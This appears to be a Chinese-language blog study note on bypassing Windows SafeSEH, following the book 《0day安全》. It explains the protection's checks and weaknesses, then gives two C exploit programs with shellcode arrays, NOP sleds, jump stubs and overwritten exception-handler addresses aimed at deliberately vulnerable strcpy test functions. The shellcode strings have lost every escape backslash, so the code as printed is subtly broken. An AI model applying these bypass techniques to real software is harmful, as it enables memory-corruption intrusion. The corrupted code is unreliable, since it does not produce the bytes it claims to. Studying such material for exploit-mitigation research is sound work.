# **SalfSEH介绍**

## **简介**

在windows XP
SP2及后续版本的操作系统中，微软引入了著名的S.E.H校验机制SafeSEH。原理就是在程序调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性检验，当发现异常处理函数不可靠时将终止异常处理函数的调用。SafeSEH实现需要操作系统与编译器的双重支持，二者缺一都会降低SafeSEH的保护能力。

## **保护措施**

1.  检查异常处理链是否位于当前程序的栈中，如果不在栈中，程序将终止异常处理函数的调用。

2.  检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用。

3.  在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler(),来对异常处理函数的有效性进行验证。检验流程图如下：

>   ![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1dvnx4esgj20lo09vwha.jpg>)

# **SalfSEH的局限**

以下是RtlIsValidHandler()函数会允许异常处理函数执行的情况

1.  异常处理函数位于加载模块内存范围之外，DEP关闭。

2.  异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH（安全S.E.H表为空），同时相应模块不是纯IL。

3.  异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH（安全S.E.H表不为空），异常处理函数地址包含在安全S.E.H表中。

以上三种情况的可行性

1.  排除DEP的干扰，我们只需要在加载模块内存范围之外找到一个跳板指令就可以转入shellcode执行。

2.  利用未启用SafeSEH模块中的指令作为跳板，转入shellcode执行。

3.  两种思路，一是清空安全S.E.H表，造成该模块未启用SafeSEH的假象；二是将我们的指令注册到安全S.E.H表中。由于安全S.E.H表的信息在内存中是加密存放的，所以突破它的可能性不大。

4.  除了上面的情况之外，如果S.E.H中的异常函数指针指向堆区，即使安全校验发现S.E.H已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将shellcode布置到堆区就可以直接跳转执行。

# **SafeSEH的突破**

## **攻击返回地址绕过SafeSEH**

如果一个程序启用了SafeSEH但是未启用GS，或者被攻击的函数没有GS保护，那么直接攻击函数的返回地址即可。

## **利用虚函数绕过SafeSEH**

思路和前面突破GS一样，在虚函数劫持程序流程时不涉及任何异常处理。

## **从堆中绕过SafeSEH**

就是利用上面可行性的第四点，在堆中布置shellcode并把SHE的指针指向堆就可以了。相当于只是一次普通的S.E.H攻击。

	#include <string.h>

	#include <stdlib.h>

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"xB0x04x41x00" //shellcode地址

	;

	void test(char * str)

	{

		char dest[200];

		strcpy(dest,str);

		int zero=0;

		zero=1/zero;

	}

	void main()

	{

		char * str=(char *)malloc(500);

		//__asm int 3;

		strcpy(str,shellcode);

		test(shellcode);

	}

上面溢出的x90数量和最后shellcode的地址需要根据实际修改

## **利用未启用SadeSEH模块绕过SafeSEH**

在加载的模块中找到一个未启用SafeSEH的模块，然后就可以利用它里面的指令来做跳板跳到shellcode里执行

作者给的实践是自己写了一个dll然后加载到程序里，相当于一个人工ROP，但我虽然加载到了程序里面缺找不到pop
pop retn的位置，所以没有成功。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1dz769ltlj20za06wwf4.jpg>)

上图就是加载进去的dll，发现SafeSEH是关闭的。然后根据里面的跳板跳到需要执行的位置就可以了。

这里作者还给出了一个需要注意的地方，在进入到含有__try{}的函数时会在

Security
Cookie+4的位置压入-2，在程序进入__try{}区域时程序会根据改__try{}块在函数中的位置而修改成不同的值如果有多个try，第一个是0，接着是1,2,3,4，那么当触发异常的时候，就知道是哪个try里面触发的异常了。如果我们把shellcode紧贴着“x90”输入的话，就会被这里的破坏，所以需要再多溢出几个位置才行。

## **利用加载模块之外的地址绕过SafeSEH**

在内存中加载的空间里，除了PE文件模块（EXE和DLL）外，还有其他的一些映射文件，我们可以再OD的“view->memory”查看程序的内存映射状态。在这些类型为Map的映射文件，SafeSEH是无视它们的，当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的，所以如果我们可以在这些文件中找到跳转指令的话就可以绕过SafeSEH。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f3vth6vcj20i8080wjz.jpg>)

只要我们能找到其中一条指令就可以绕过SafeSEH了。在这里有一个od的插件叫OllyFindAddr，可以在这里面找到跳板指令。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f40468pej20ez0cbmxq.jpg>)

作者给出的代码（根据我的操作系统做过调整）

	#include "stdio.h"

	#include <string.h>

	#include <windows.h>

	char shellcode[]=

	"xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"

	"x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"

	"x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"

	"x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"

	"xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"

	"x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"

	"xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"

	"xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"

	"x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"

	"x53x68x77x65x73x74x68x66x61x69x6Cx8BxC4x53x50x50"

	"x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"

	"x90x90x90x90x90x90x90x90"

	"xE9x33xFFxFFxFFx90x90x90"// machine code of far jump and x90

	"xEBxF6x90x90"// machine code of short jump and x90

	"x0Bx0Bx27x00"// address of call [ebp+30] in outside memory

	;

	DWORD MyException(void)

	{

		printf("There is an exception");

		getchar();

		return 1;

	}

	void test(char * input)

	{

		char str[200];

		strcpy(str,input);

		int zero=0;

		__try

		{

			zero=1/zero;

		}

		__except(MyException())

		{}

	}

	int main()

	{

		__asm int 3

		test(shellcode);

		return 0;

	}

这里我们找到的其他模块的跳板是

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f4a42xhqj20lh0gwdhf.jpg>)

正好第一个不在SafeSEH所保护的模块，但0x00270B0B最前面的两个字符正好是x00所以如果把shellcode放在它后面，程序运行到x00就会截至。所以我们只能把shellcode放在前面，那么我们还需要一个跳板去跳到shellcode的位置。我们可以计算一下，shellcode的位置在0x0012FE98，最近的SHE在0x12FF68之间差了208个字节，所以我们至少要覆盖到208+4的位置之后再放置ebp+0x30的跳板。这里还有一个问题就是通过跳板指令转入shellcode后首先是4个字节的0x90的填充，剩下的我们只有4个字节可以用，所以一次跳转并不能让我们跳到shellcode，那么我们就可以用两次跳转，先用一个段跳转指令跳到一个长跳转指令的位置，再跳到shellcode。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f4uh4u6uj20d10b8wh2.jpg>)

下面是实际的图，模块外的断点需要下硬件断点才能访问到

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f4vkrw61j20eu03wjrc.jpg>)

接下来我们回到最开始的问题，为什么用OllyFindAddr找到的跳板指令可以跳回到SHE链里面。

![](<http://ww1.sinaimg.cn/large/7fb67c86gy1g1f4ye1ufvj20zy0f47h8.jpg>)

参考链接：
《0day安全漏洞分析技术》
http://oldblog.giantbranch.cn/?p=519#SafeSEH-4
